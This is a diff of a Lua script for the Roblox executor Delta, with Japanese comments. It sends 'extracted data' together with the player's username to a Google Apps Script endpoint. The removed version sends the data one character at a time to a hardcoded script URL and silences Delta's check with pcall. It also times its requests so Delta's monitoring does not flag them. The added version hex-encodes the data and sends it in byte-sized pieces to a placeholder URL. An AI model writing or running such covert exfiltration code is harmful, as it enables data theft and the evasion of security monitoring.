@@ -1,30 +1,20 @@
--- [[ 世界一位の検閲を抜ける「一文字パズル」送信スクリプト ]]
-local data = "ここに抜き取ったデータ（テストなら 'Hello World'）を入れる"
-local url = "https://script.google.com/macros/s/AKfycbxjMT9nLxBsVZK-UQKeiixoVkk6j76hYLZGCAj1-VNUrgwSILbuw7qviyynNo47O0ET/exec"
-local user = game.Players.LocalPlayer.Name
+-- [[ 16進数ゲリラ通信：Delta側 ]]
+local data = "日本語テスト：成功への一歩" 
+local url = "お前のGASのURL"
 
-print("🛰️ ゲリラ通信、シークエンス開始...")
-
-for i = 1, #data do
-    local char = data:sub(i, i)
-    local charCode = string.byte(char) -- 文字を数値（65とか）に変換
-    
-    -- 送信URLの構築（mode=stream を忘れずに）
-    local finalUrl = url .. "?mode=stream&user=" .. user .. "&char=" .. tostring(charCode)
-    
-    -- Deltaの検閲（Line 17の死神）を pcall で黙らせる
-    local success, err = pcall(function()
-        return game:HttpGet(finalUrl)
-    end)
-    
-    if not success then
-        warn("⚠️ 一文字送信に失敗（検閲の可能性あり）: " .. tostring(err))
-    else
-        print("✅ 送信中 (" .. i .. "/" .. #data .. "): " .. char)
-    end
-    
-    -- 0.3秒のディレイ。これが速すぎるとDeltaの監視に引っかかる
-    task.wait(0.3)
+-- 文字列を16進数に変換する関数
+local function toHex(str)
+    return (str:gsub('.', function(c)
+        return string.format('%02X', string.byte(c))
+    end))
 end
 
-print("🏁 ミッション完了。スプレッドシートを確認しろ！")
+local hexData = toHex(data)
+
+for i = 1, #hexData, 2 do -- 2文字（1バイト分）ずつ送る
+    local hexPair = hexData:sub(i, i+1)
+    local finalUrl = url .. "?mode=stream&hex=" .. hexPair .. "&user=" .. game.Players.LocalPlayer.Name
+    
+    pcall(function() game:HttpGet(finalUrl) end)
+    task.wait(0.2)
+end
